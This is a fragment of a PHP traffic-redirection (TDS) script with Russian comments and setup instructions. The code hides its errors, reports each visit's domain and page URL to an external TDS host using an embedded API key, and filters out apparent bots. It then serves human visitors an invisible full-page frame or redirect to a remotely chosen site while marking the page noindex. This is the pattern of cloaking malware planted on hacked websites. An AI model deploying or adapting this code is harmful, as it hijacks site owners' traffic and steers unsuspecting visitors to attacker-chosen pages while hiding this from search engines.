...
@error_reporting(0);
$z_id = 'pf';//ID группы
$z_api_key_host = 'Alone@123';//API ключ
$z_url = 'https://vm1268909.ssd.had.yt/?api=';//ссылка на TDS (замените только домен)
...
$z_em_lang = 0;//если пустой язык браузера - это бот (0/1)
...
if($z_status == 1){
	...
	if(empty($z_lang) && $z_em_lang == 1){
		$z_bot = 'empty_lang';
	}
	$z_domain = $_SERVER['HTTP_HOST'];
	$z_page_url = 'https://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
...
if($z_bot == $z_empty && !empty($z_out)){echo '<!DOCTYPE html><html xmlns="https://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_out.'"></frameset></html>';exit();}
...
if($z_bot == $z_empty && !empty($z_out) && stristr($z_out, ';')){
	...
	if($z_type == 'iframe'){echo '<!DOCTYPE html><html xmlns="https://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_link.'"></frameset></html>';exit();}
}
Для редиректа пропишите в ауте: redirect;https://platnik.ru
Для фрейма: iframe;https://platnik.ru
*/
?>